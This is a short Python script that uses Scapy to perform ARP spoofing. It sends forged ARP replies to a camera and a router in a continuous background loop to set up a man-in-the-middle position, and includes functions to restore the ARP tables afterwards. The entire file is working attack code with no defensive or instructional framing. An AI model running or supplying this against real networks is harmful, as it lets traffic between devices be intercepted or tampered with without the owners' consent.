from scapy.all import *
import time

interface = "wlp0s20f3"

# Send a fake ARP response saying that macAttacker has the ip ipToSpoof
def spoof(ipVictim, macVictim, macAttacker, ipToSpoof):    
    pkt = Ether() / ARP()

    pkt[Ether].src = macAttacker
    pkt[Ether].dst = macVictim
    pkt[ARP].hwsrc = macAttacker
    pkt[ARP].hwdst = macVictim
    pkt[ARP].psrc = ipToSpoof
    pkt[ARP].pdst = ipVictim
    pkt[ARP].op = 2

    sendp(pkt, iface=interface, verbose=False)

# Broadcast an ARP response with correct MAC-IP combination
def restore(ipDest, ipSource, macSource):
    print("Restoring victim ARP table")    
    pkt = Ether() / ARP()

    pkt[Ether].src = macSource
    pkt[Ether].dst = "ff:ff:ff:ff:ff:ff"
    pkt[ARP].hwsrc = macSource
    pkt[ARP].hwdst = "ff:ff:ff:ff:ff:ff"
    pkt[ARP].psrc = ipSource
    pkt[ARP].pdst = ipDest
    pkt[ARP].op = 2

    sendp(pkt, iface=interface, verbose=False)

# Perform a persisten MitM attack by continuously ARP poisoning the camera and the router
def poison(ipCamera, macCamera, macAttacker, ipRouter, macRouter):
    try:
        while True:
            spoof(ipCamera, macCamera, macAttacker, ipRouter)
            spoof(ipRouter, macRouter, macAttacker, ipCamera)
            time.sleep(1)
    except KeyboardInterrupt:
        pass

# Initialize the ARP poisoning on a different thread
def initPoison(ipCamera, macCamera, macAttacker, ipRouter, macRouter):
    print("Start ARP poisoning")
    poisonThread = threading.Thread(target=poison, args=(ipCamera, macCamera, macAttacker, ipRouter, macRouter))
    poisonThread.start()

# Restore the network after finishing the attack
def endPoison(ipCamera, macCamera, ipRouter, macRouter):
    restore(ipRouter, ipCamera, macCamera)
    restore(ipCamera, ipRouter, macRouter)
    print("ARP poisoning stopped")
